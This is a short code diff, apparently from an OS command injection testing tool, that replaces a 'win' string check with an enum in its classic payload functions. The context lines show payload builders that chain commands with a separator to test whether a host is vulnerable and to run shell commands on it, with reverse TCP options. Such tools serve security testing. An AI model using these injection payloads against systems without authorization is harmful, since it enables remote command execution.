@@ -24,7 +24,7 @@ The available "classic" payloads.
 Classic decision payload (check if host is vulnerable).
 """
 def decision(separator, TAG, randv1, randv2):
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     if settings.SKIP_CALC:
       payload = (separator +
                 "echo " + TAG + TAG + TAG + settings.CMD_NUL
@@ -77,7 +77,7 @@ def decision(separator, TAG, randv1, randv2):
 __Warning__: The alternative shells are still experimental.
 """
 def decision_alter_shell(separator, TAG, randv1, randv2):
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     if settings.SKIP_CALC: 
       python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print('" + TAG + "'%2B'" + TAG + "'%2B'" + TAG + "')\""
     else:
@@ -108,7 +108,7 @@ def decision_alter_shell(separator, TAG, randv1, randv2):
 Execute shell commands on vulnerable host.
 """
 def cmd_execution(separator, TAG, cmd):
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     if settings.REVERSE_TCP:
       payload = (separator + cmd + settings.SINGLE_WHITESPACE
                 )
@@ -143,7 +143,7 @@ def cmd_execution(separator, TAG, cmd):
 __Warning__: The alternative shells are still experimental.
 """
 def cmd_execution_alter_shell(separator, TAG, cmd):
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     if settings.REVERSE_TCP:
       payload = (separator + cmd + settings.SINGLE_WHITESPACE
                 )
